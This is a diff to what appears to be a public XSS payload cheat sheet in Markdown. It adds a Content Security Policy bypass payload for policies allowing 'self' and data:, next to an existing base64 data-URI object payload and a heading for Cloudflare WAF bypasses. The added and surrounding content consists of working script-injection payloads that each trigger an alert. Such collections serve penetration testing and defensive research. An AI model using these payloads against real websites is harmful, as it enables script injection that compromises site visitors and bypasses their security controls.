@@ -932,6 +932,15 @@ Works for CSP like `script-src self`
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
+### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
+
+Works for CSP like `script-src 'self' data:`
+
+```javascript
+<script ?/src="data:+,\u0061lert%281%29">/</script>
+```
+
+
 ## Common WAF Bypass
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar) - 3rd june 2019
